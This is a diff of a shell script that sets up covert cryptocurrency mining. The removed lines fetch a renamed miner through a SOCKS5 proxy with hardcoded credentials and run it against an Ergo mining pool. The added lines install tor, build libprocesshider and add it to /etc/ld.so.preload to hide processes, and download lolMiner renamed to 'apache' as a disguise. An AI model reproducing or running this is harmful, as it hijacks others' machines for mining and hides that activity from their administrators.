@@ -1,44 +1,15 @@
 #!/bin/sh
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
 
-tar -xvzf graphics.tar.gz
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
+sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
 
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo ""
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo ""
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-#./graftcp/graftcp 
-./bezzHash --url=9gL1cBifCAEzDjKd9ov5sHpWbxSt2jqAiHhVrXPxhWc6B6zfW7G@solo-erg.2miners.com:9999 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
+tar -xf lolMiner_v1.51_Lin64.tar.gz
+cd 1.51
+mv lolMiner ../apache
+cd ..
